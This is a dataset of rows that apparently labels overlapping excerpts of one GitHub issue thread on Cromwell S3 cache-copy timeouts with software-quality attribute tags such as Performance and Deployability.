size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_Comma",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1078,Deployability,update,updated,1078,"size is the problem. Does the issue persist after restarting the server? I committed a change to; the develop branch a few weeks ago that does a better job of cleaning up; the copying resources. If the restart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutExcepti",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1312,Deployability,release,release,1312,"tart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1388,Deployability,configurat,configuration,1388,"tart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1474,Deployability,Install,Installing,1474,"? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1388,Modifiability,config,configuration,1388,"tart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1798,Modifiability,config,config,1798,"re, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadin",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:42,Performance,cache,cached,42,"This is unusual, I have successfully call cached files of 1 TB in testing; so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to; the develop branch a few weeks ago that does a better job of cleaning up; the copying resources. If the restart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_Comma",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:760,Performance,cache,cached,760,"This is unusual, I have successfully call cached files of 1 TB in testing; so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to; the develop branch a few weeks ago that does a better job of cleaning up; the copying resources. If the restart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_Comma",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:888,Performance,cache,cached,888,"This is unusual, I have successfully call cached files of 1 TB in testing; so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to; the develop branch a few weeks ago that does a better job of cleaning up; the copying resources. If the restart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_Comma",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1103,Performance,perform,perform,1103,"size is the problem. Does the issue persist after restarting the server? I committed a change to; the develop branch a few weeks ago that does a better job of cleaning up; the copying resources. If the restart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutExcepti",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1189,Performance,cache,cached,1189,"size is the problem. Does the issue persist after restarting the server? I committed a change to; the develop branch a few weeks ago that does a better job of cleaning up; the copying resources. If the restart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutExcepti",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1656,Performance,cache,cache,1656,"t copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1685,Performance,cache,cache,1685,"> for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving th",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1767,Performance,cache,cache,1767,"istence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Re",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1821,Performance,tune,tune,1821,"re, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadin",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1947,Performance,cache,cache,1947," of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > 